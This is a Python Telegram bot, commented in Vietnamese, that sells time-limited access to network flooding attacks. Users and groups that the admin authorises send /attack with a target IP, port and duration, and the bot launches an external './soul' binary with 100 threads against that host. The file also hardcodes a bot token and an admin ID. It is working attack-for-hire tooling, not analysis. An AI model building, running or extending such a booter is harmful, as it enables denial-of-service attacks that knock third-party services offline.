import telebot
import subprocess
import threading
import psutil
import time
from datetime import datetime, timedelta

TOKEN = "7656031517:AAFSYcm8x17xafPqA1d9Gl0u-znGVnjkkFU"
ADMIN_ID = 7088683094  # Thay bằng ID admin của bạn

bot = telebot.TeleBot(TOKEN)

running_attacks = {}
allowed_users = {}  # Lưu user ID kèm ngày hết hạn
allowed_groups = {}  # Lưu group ID kèm ngày hết hạn
last_attack_time = {}  # Lưu thời gian attack của từng user
ATTACK_COOLDOWN = 120  # Giới hạn 2 phút (120 giây) / lần attack
DEFAULT_THREADS = "100"  # Số luồng mặc định

# 📌 Xóa user/group hết hạn
def check_expired_access():
    current_time = datetime.now()
    expired_users = [user for user, exp in allowed_users.items() if exp < current_time]
    expired_groups = [group for group, exp in allowed_groups.items() if exp < current_time]

    for user in expired_users:
        del allowed_users[user]
    
    for group in expired_groups:
        del allowed_groups[group]

# ✅ Lệnh thêm user vào danh sách có thời hạn
@bot.message_handler(commands=['add_user'])
def add_user(message):
    if message.chat.id != ADMIN_ID:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này.")

    args = message.text.split()
    if len(args) != 3:
        return bot.send_message(message.chat.id, "❌ Hãy nhập đúng định dạng: /add_user <user_id> <số ngày>")

    try:
        user_id = int(args[1])
        days = int(args[2])
        expiry_date = datetime.now() + timedelta(days=days)
        allowed_users[user_id] = expiry_date
        bot.send_message(message.chat.id, f"✅ Người dùng `{user_id}` được cấp quyền sử dụng bot trong `{days}` ngày.", parse_mode="Markdown")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Lỗi! Hãy nhập đúng định dạng.")

# ❌ Lệnh xóa user khỏi danh sách
@bot.message_handler(commands=['remove_user'])
def remove_user(message):
    if message.chat.id != ADMIN_ID:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này.")

    args = message.text.split()
    if len(args) != 2:
        return bot.send_message(message.chat.id, "❌ Hãy nhập đúng định dạng: /remove_user <user_id>")

    try:
        user_id = int(args[1])
        if user_id in allowed_users:
            del allowed_users[user_id]
            bot.send_message(message.chat.id, f"✅ Người dùng `{user_id}` đã bị xóa khỏi danh sách sử dụng bot.", parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, "❌ Người dùng này không có trong danh sách.")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Lỗi! Hãy nhập đúng định dạng.")

# ✅ Lệnh thêm group vào danh sách có thời hạn
@bot.message_handler(commands=['add_group'])
def add_group(message):
    if message.chat.id != ADMIN_ID:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này.")

    args = message.text.split()
    if len(args) != 3:
        return bot.send_message(message.chat.id, "❌ Hãy nhập đúng định dạng: /add_group <group_id> <số ngày>")

    try:
        group_id = int(args[1])
        days = int(args[2])
        expiry_date = datetime.now() + timedelta(days=days)
        allowed_groups[group_id] = expiry_date
        bot.send_message(message.chat.id, f"✅ Nhóm `{group_id}` được cấp quyền sử dụng bot trong `{days}` ngày.", parse_mode="Markdown")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Lỗi! Hãy nhập đúng định dạng.")

# ❌ Lệnh xóa group khỏi danh sách
@bot.message_handler(commands=['remove_group'])
def remove_group(message):
    if message.chat.id != ADMIN_ID:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này.")

    args = message.text.split()
    if len(args) != 2:
        return bot.send_message(message.chat.id, "❌ Hãy nhập đúng định dạng: /remove_group <group_id>")

    try:
        group_id = int(args[1])
        if group_id in allowed_groups:
            del allowed_groups[group_id]
            bot.send_message(message.chat.id, f"✅ Nhóm `{group_id}` đã bị xóa khỏi danh sách sử dụng bot.", parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, "❌ Nhóm này không có trong danh sách.")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Lỗi! Hãy nhập đúng định dạng.")

# 📌 Kiểm tra quyền của user trước khi attack
@bot.message_handler(commands=['attack'])
def run_attack(message):
    user_id = message.from_user.id
    group_id = message.chat.id

    check_expired_access()  # Xóa user/group hết hạn

    if user_id not in allowed_users and group_id not in allowed_groups:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng bot.")

    # Kiểm tra cooldown
    last_time = last_attack_time.get(user_id, 0)
    if time.time() - last_time < ATTACK_COOLDOWN:
        return bot.send_message(message.chat.id, "⏳ Bạn cần chờ thêm trước khi tiếp tục.")

    args = message.text.split()
    if len(args) != 4:
        return bot.send_message(message.chat.id, "❌ Hãy nhập đúng định dạng: /attack <IP> <port> <time>")

    ip, port, duration = args[1], args[2], args[3]
    try:
        process = subprocess.Popen(["./soul", ip, port, duration, DEFAULT_THREADS], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        running_attacks[process.pid] = process
        threading.Thread(target=monitor_process, args=(process.pid,)).start()
        bot.send_message(message.chat.id, f"🚀 Tấn công đã bắt đầu!\n🔹 IP: `{ip}`\n🔹 Port: `{port}`\n🔹 Time: `{duration}`s", parse_mode="Markdown")
        last_attack_time[user_id] = time.time()
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Lỗi khi chạy attack: {str(e)}")

# 🚀 Chạy bot
def main():
    bot.send_message(ADMIN_ID, "🤖 **Bot đã khởi động!**")
    bot.polling()

while True:
    try:
        bot.polling(none_stop=True, timeout=60)
    except Exception as e:
        print(f"Lỗi xảy ra: {e}")
        time.sleep(5)

if __name__ == "__main__":
    main()
